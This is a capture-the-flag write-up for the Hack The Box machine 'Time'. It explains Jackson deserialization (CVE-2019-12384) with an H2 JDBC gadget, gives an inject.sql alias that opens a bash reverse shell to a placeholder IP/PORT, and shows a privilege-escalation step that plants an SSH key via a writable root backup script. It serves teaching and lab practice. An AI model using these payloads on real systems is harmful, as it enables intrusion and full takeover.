<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Overview This box is a Linux one. For the initial foothold you need to exploit a bug within the Jackson library for deserializing JSON&rsquo;s leading to a SSRF which can leverage a RCE."><title>Time</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://hakbrain.xyz//icon.png><link href=https://hakbrain.xyz/styles.f40f9c8ac1c106641723dab5233fc67c.min.css rel=stylesheet><link href=https://hakbrain.xyz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://hakbrain.xyz/js/darkmode.8bfc78cc60cc5da6df81ec79c82c3775.min.js></script>
<script src=https://hakbrain.xyz/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://hakbrain.xyz/js/popover.abe6a51cc7138c5dff00f151dd627ad1.min.js></script>
<script src=https://hakbrain.xyz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script src=https://hakbrain.xyz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script src=https://hakbrain.xyz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const BASE_URL="https://hakbrain.xyz/",fetchData=Promise.all([fetch("https://hakbrain.xyz/indices/linkIndex.3b45598c5a0d8dd3dd7824af149a522d.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://hakbrain.xyz/indices/contentIndex.7237fc49b072a2a293fa9da2e7e12f2d.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://hakbrain.xyz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://hakbrain.xyz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/hakbrain.xyz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://hakbrain.xyz/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://hakbrain.xyz/>üï∏Ô∏è H@kBr4in</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Time</h1><p class=meta>Last updated
Dec 9, 2022
<a href=https://github.com/vlagh3/hakbrain/tree/hugo/content/write-ups/htb/time.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://hakbrain.xyz/tags/writeups/>Writeups</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#overview>Overview</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#understanding-the-cve>Understanding the CVE</a><ol><li><a href=#what-is-serializationdeserialization>What is serialization/deserialization</a></li><li><a href=#how-java-gadgets-work>How java gadgets work</a></li><li><a href=#jackson-library-deserialization-vulnerability-poc>Jackson library deserialization vulnerability POC</a></li></ol></li><li><a href=#leveraging-what-weve-learned-to-own-user>Leveraging what we&rsquo;ve learned to own user</a></li><li><a href=#privilige-escalation>Privilige escalation</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#references>References</a></li><li><a href=#see-also>See Also</a></li></ol></nav></details></aside><a href=#overview><h2 id=overview><span class=hanchor arialabel=Anchor># </span>Overview</h2></a><p>This box is a Linux one. For the initial foothold you need to exploit a bug within the Jackson library for deserializing <strong>JSON&rsquo;s</strong> leading to a SSRF which can leverage a RCE. Once on the box a simple classic enumeration reveals a root bash script with read/write access. Consequenlty, just importing your pub <strong>SSH</strong> key into the <code>authorized_keys</code> file will grant access to root.</p><a href=#enumeration><h2 id=enumeration><span class=hanchor arialabel=Anchor># </span>Enumeration</h2></a><p>Running nmap reveals 2 services:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; nmap -sC -sV -oA nmap/time 10.10.10.214
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Online JSON parser
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></td></tr></table></div></div><p>Once we check the web server, we see that we can beutify/validate JSON. Also, the validate functionality is in Beta. So let&rsquo;s check that first.<br></p><p>Upon submitting <code>{"test"}</code> we see the following error:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
</span></span></code></pre></td></tr></table></div></div><p>So it&rsquo;s expecting an array: <code>["test"]</code>.
But that also throws an error:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id &#39;test&#39; as a subtype of [simple type, class java.lang.Object]: no such class found
</span></span></code></pre></td></tr></table></div></div><p>Now, in both of our errors we see that they&rsquo;re thrown by a library called <em>jackson</em>, which is used to
serialize or map POJO <em>(Plain Old Java Objects)</em> to JSON and deserialize JSON to POJO. With some more searching we find a
<a href=https://blog.doyensec.com/2019/07/22/jackson-gadgets.html rel=noopener>CVE</a> which addresses a deserialization vulnerability where an attacker could control the class to be deserialized.</p><a href=#understanding-the-cve><h2 id=understanding-the-cve><span class=hanchor arialabel=Anchor># </span>Understanding the CVE</h2></a><a href=#what-is-serializationdeserialization><h3 id=what-is-serializationdeserialization><span class=hanchor arialabel=Anchor># </span>What is serialization/deserialization</h3></a><p>In order to understand what deserialization vulnerabilities are and behave, we firstly need to get familiar with what serialization & deserialization is. Swapneil Kumar Dash wrote a beautiful
<a href=https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d rel=noopener>article</a> about this, however I will provide a short overview in this post as well.</p><blockquote><p>In computing, serialization is the process of translating a data structure or object state into a format that can be stored or transmitted and reconstructed later. Deserialization is the opposite.</p></blockquote><p>In our case, we translate java objects into JSON and vice-versa.</p><a href=#what-could-go-wrong-><h4 id=what-could-go-wrong-><span class=hanchor arialabel=Anchor># </span>What could go wrong ?</h4></a><p>Usually, in java we can use something like this to deserialize data:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>FileInputStream</span> <span class=n>fin</span>  <span class=o>=</span> <span class=k>new</span> <span class=n>FileInputStream</span><span class=o>(</span><span class=s>&#34;your/file/path&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=n>ObjectInputStream</span> <span class=n>in</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ObjectInputStream</span><span class=o>(</span><span class=n>fin</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=n>customClassInstance</span>  <span class=o>=</span> <span class=o>(</span><span class=n>CustomClass</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></td></tr></table></div></div><p>The main problem lies within the way readObject deserializes data which executes the class while also
throwing an error if we give it a serialized input of a different class.</p><p>I won&rsquo;t go into much detail here on this topic, since it&rsquo;s a broad one. However, if you&rsquo;re interested in
learning more about it you should check the resources and
<a href="https://www.youtube.com/watch?v=t-zVC-CxYjw" rel=noopener>this talk</a> by <strong>Alexei Kojenov</strong> which also made some great
<a href=https://github.com/kojenov/serial rel=noopener>examples</a> you can play
around with.</p><a href=#how-java-gadgets-work><h3 id=how-java-gadgets-work><span class=hanchor arialabel=Anchor># </span>How java gadgets work</h3></a><p>Gadgets are just a class or funcion that&rsquo;s available within the executing scope of an application. For example the following code is a simple implementation in Java:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/* CacheManager.java */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>CacheManager</span> <span class=kd>implements</span> <span class=n>Serializable</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>private</span> <span class=kd>final</span> <span class=n>Runnable</span> <span class=n>initHook</span><span class=o>;</span>
</span></span><span class=line><span class=cl>	<span class=kd>public</span> <span class=kt>void</span> <span class=nf>readObject</span><span class=o>(</span><span class=n>ObjectInputStream</span> <span class=n>in</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>		<span class=n>in</span><span class=o>.</span><span class=na>defaultReadObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>initHook</span><span class=o>.</span><span class=na>run</span><span class=o>();</span>
</span></span><span class=line><span class=cl>	<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* CommandTask.java */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>CommandTask</span> <span class=kd>implements</span> <span class=n>Runable</span><span class=o>,</span> <span class=n>Serializable</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>private</span> <span class=kd>final</span> <span class=n>String</span> <span class=n>cmd</span><span class=o>;</span>
</span></span><span class=line><span class=cl>	<span class=kd>public</span> <span class=nf>CommandTask</span><span class=o>(</span><span class=n>String</span> <span class=n>cmd</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>		<span class=k>this</span><span class=o>.</span><span class=na>cmd</span> <span class=o>=</span> <span class=n>cmd</span><span class=o>;</span>
</span></span><span class=line><span class=cl>	<span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kd>public</span> <span class=kt>void</span> <span class=nf>run</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>		<span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=n>cmd</span><span class=o>);</span>
</span></span><span class=line><span class=cl>	<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Here, an attacker can inject a serialized <code>CommandTask</code> into an input stream that will be read by <code>CacheManager</code>, which in return invokes run. Therefore, he gains arbitrary command execution.<br></p><a href=#jackson-library-deserialization-vulnerability-poc><h3 id=jackson-library-deserialization-vulnerability-poc><span class=hanchor arialabel=Anchor># </span>Jackson library deserialization vulnerability POC</h3></a><p>The <em>CVE</em> of interest is focusing mostly on the <em>Jackson</em> library. They found that when <em>Jackson</em> deserializes a specific class (<code>ch.qos.logback.core.db.DriverManagerConnectionSource</code>), it can be abused to instantiate a Java Database Connectivity <em>(JDBC)</em>, which is used to connect & interact with the dabase. To understand better let&rsquo;s break down the payload used in the
<a href=https://blog.doyensec.com/2019/07/22/jackson-gadgets.html rel=noopener><strong>POC</strong></a>:</p><p><code>$ "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:\"}]"</code></p><p>As said previously we use the <code>DriverManagerConnectionSource</code> class to pass an url, which will trigger
<a href=https://www.javadoc.io/doc/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#setUrl%28java.lang.String%29 rel=noopener><code>setUrl</code></a>. Afterwards, the object is serialized into a JSON object again. Consequently, the <code>getConnection()</code>
<a href=https://www.javadoc.io/static/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#getConnection%28%29 rel=noopener>method</a> is called which creates an in-memory database. This is further used to create a remote connection.<br></p><p>Until now, we&rsquo;ve only got a way to generate a Server Side Request Forgery <em>(SSRF)</em>. So how could we turn this into a full chain RCE ?
In order to achieve that, the guys from
<a href=https://doyensec.com/ rel=noopener>doyensec</a> leveraged the
<a href=http://www.h2database.com/html/features.html rel=noopener>H2</a> JDBC driver which has the capability to run SQL scripts from the JDBC url. This alone won&rsquo;t allow an attacker to run Java code inside the JVM context, however H2 has the capability to specify custom aliases containing java code
<a href=https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html rel=noopener>which can be abused</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>CREATE</span><span class=w> </span><span class=k>ALIAS</span><span class=w> </span><span class=n>SHELLEXEC</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=err>$$</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>shellexec</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=p>)</span><span class=w> </span><span class=n>throws</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=n>io</span><span class=p>.</span><span class=n>IOException</span><span class=w> </span><span class=err>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>java</span><span class=p>.</span><span class=n>util</span><span class=p>.</span><span class=n>Scanner</span><span class=w> </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=n>util</span><span class=p>.</span><span class=n>Scanner</span><span class=p>(</span><span class=n>Runtime</span><span class=p>.</span><span class=n>getRuntime</span><span class=p>().</span><span class=k>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>).</span><span class=n>getInputStream</span><span class=p>())</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=n>useDelimiter</span><span class=p>(</span><span class=s2>&#34;\\A&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=k>return</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=n>hasNext</span><span class=p>()</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=k>next</span><span class=p>()</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=s2>&#34;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>}$$</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>CALL</span><span class=w> </span><span class=n>SHELLEXEC</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>As a result, we only need to serve a sql file to the target machine that makes the request to our in-memory <em>DB</em> with the use of <code>DriverManagerConnectionSource</code> and we have remote code execution.</p><a href=#leveraging-what-weve-learned-to-own-user><h2 id=leveraging-what-weve-learned-to-own-user><span class=hanchor arialabel=Anchor># </span>Leveraging what we&rsquo;ve learned to own user</h2></a><p>We&rsquo;ve learned that we can use a deserialization vulnerability within Jackson to leverage a connection to a in-memory <em>DB</em>, which accepts aliases that can be used to execute commands. So, all wee need to do is:</p><ol><li><em>Prepare the <code>inject.sql</code> script</em></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>CREATE</span> <span class=n>ALIAS</span> <span class=n>SHELLEXEC</span> <span class=n>AS</span> <span class=n>$$</span> <span class=n>String</span> <span class=nf>shellexec</span><span class=o>(</span><span class=n>String</span> <span class=n>cmd</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>	<span class=n>java</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>Scanner</span> <span class=n>s</span> <span class=o>=</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>util</span><span class=o>.</span><span class=na>Scanner</span><span class=o>(</span><span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=n>cmd</span><span class=o>).</span><span class=na>getInputStream</span><span class=o>())</span>
</span></span><span class=line><span class=cl>		<span class=o>.</span><span class=na>useDelimiter</span><span class=o>(</span><span class=s>&#34;\\A&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>s</span><span class=o>.</span><span class=na>hasNext</span><span class=o>()</span> <span class=o>?</span> <span class=n>s</span><span class=o>.</span><span class=na>next</span><span class=o>()</span> <span class=o>:</span> <span class=s>&#34;&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span><span class=n>$$</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=n>CALL</span> <span class=nf>SHELLEXEC</span><span class=o>(</span><span class=err>&#39;</span><span class=n>bash</span> <span class=o>-</span><span class=n>i</span> <span class=o>&gt;&amp;</span> <span class=o>/</span><span class=n>dev</span><span class=o>/</span><span class=n>tcp</span><span class=o>/</span><span class=n>IP</span><span class=o>/</span><span class=n>PORT</span> <span class=n>0</span><span class=o>&gt;&amp;</span><span class=n>1</span><span class=err>&#39;</span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><ol start=2><li><p><em>Setup http server & netcat listener</em>
<img src=https://i.imgur.com/kYaG0vZ.png width=auto alt></p></li><li><p><em>Abuse the deserialization vulnerability & use the <code>DriverManagerConnectionSource</code> gadget</em></p></li><li><p><em>Enjoy your shell</em>
<img src=https://i.imgur.com/jh0fwLP.png width=auto alt></p></li></ol><a href=#privilige-escalation><h2 id=privilige-escalation><span class=hanchor arialabel=Anchor># </span>Privilige escalation</h2></a><p>Once on the box, a simple enumeration reveals that we have write access to a backup script ran by root.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-5.0$ cat /usr/bin/timer_backup.sh
</span></span><span class=line><span class=cl>cat /usr/bin/timer_backup.sh
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>zip -r website.bak.zip /var/www/html <span class=o>&amp;&amp;</span> mv website.bak.zip /root/backup.zip
</span></span></code></pre></td></tr></table></div></div><p>So, we could just import our public SSH key and have root access.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;echo SSH_PUB_KEY &gt;&gt; /root/.ssh/authorized_keys&#34;</span> &gt;&gt; /usr/bin/timer_backup.sh
</span></span></code></pre></td></tr></table></div></div><a href=#conclusion><h2 id=conclusion><span class=hanchor arialabel=Anchor># </span>Conclusion</h2></a><p>I&rsquo;ve seen that a lot of people said that this box is easy, which I can agree in the way that you can find the CVE quite easy and modify the POC payload to get the flags and move on, without diving more into it. However, I think that this is a great box for someone new and even for some more experienced people. I say this because if you really want to understand what&rsquo;s going on behind the scenes, which you should, you understand new concepts such as: <em>java deserialization, gadgets, how an actual CVE is found, etc</em>.</p><p>Honestly, I learned a lot by playing around with this box and afterall this is the goal of <em>HTB</em>. To learn new concepts that you can add to your skill-set which elevates your craft.</p><p>If you want to dig deeper into deserealization attacks within java libraries, I suggest you check the references down below. I found some really great articles/talks about this subject which I can&rsquo;t give enough credit.</p><a href=#references><h2 id=references><span class=hanchor arialabel=Anchor># </span>References</h2></a><ul><li><a href=https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d rel=noopener>Understanding Java Deserialization</a></li><li><a href=https://github.com/ikkisoft/SerialKiller rel=noopener>Java deserealization lib to secure apps</a></li><li><a href=https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038 rel=noopener>Understanding insecure implementation of Jackson deserialization</a></li><li><a href=https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96 rel=noopener>On Jackson CVEs: Don‚Äôt Panic ‚Äî Here is what you need to know</a></li><li><a href=https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858 rel=noopener>SnakeYaml Deserilization exploited</a></li><li><a href=https://github.com/frohoff/ysoserial rel=noopener>POC tool 4 generating payloads that exploit unsage Java object deserilization</a></li><li><a href=https://brandur.org/fragments/gadgets-and-chains rel=noopener>Depickling, gadgets and chains: The class of exploit that unraveled Equifax</a></li><li><a href=https://github.com/galimba/Jackson-deserialization-PoC rel=noopener>POC Jackson deserilization on Spring web app</a></li><li><a href=https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json rel=noopener>Java deserilization cheat-sheet</a></li><li><a href=https://github.com/FasterXML/jackson rel=noopener>Jackson Library</a></li><li><a href="https://www.youtube.com/watch?v=KSA7vUkXGSg" rel=noopener>Marshalling Pickles - OWASP AppSec California 2015</a></li><li><a href=https://blog.doyensec.com/2019/07/22/jackson-gadgets.html rel=noopener>CVE-2019-12384</a></li></ul><a href=#see-also><h2 id=see-also><span class=hanchor arialabel=Anchor># </span>See Also</h2></a><ul><li><a href=/write-ups/HTB rel=noopener class=internal-link data-src=/write-ups/HTB>write-ups/HTB</a></li></ul></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li>No backlinks found</li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div 